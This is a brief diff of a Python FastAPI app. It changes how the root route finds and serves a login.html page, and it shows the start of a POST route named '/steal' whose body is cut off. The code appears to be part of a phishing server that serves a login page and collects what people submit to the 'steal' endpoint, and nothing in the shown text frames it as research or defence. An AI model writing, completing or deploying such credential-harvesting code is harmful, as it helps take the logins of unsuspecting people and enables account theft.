@@ -1,12 +1,16 @@
 from fastapi import FastAPI, Request
 from fastapi.responses import FileResponse
 import json
+from pathlib import Path
 
 app = FastAPI()
 
 @app.get("/")
-async def index():
-    return FileResponse("login.html")
+def home():
+    # 抓取目前 main.py 所在的資料夾，然後加上 login.html
+    base_dir = Path(__file__).resolve().parent
+    file_path = base_dir / "login.html"
+    return FileResponse(file_path)
 
 @app.post("/steal")
 async def steal(request: Request):
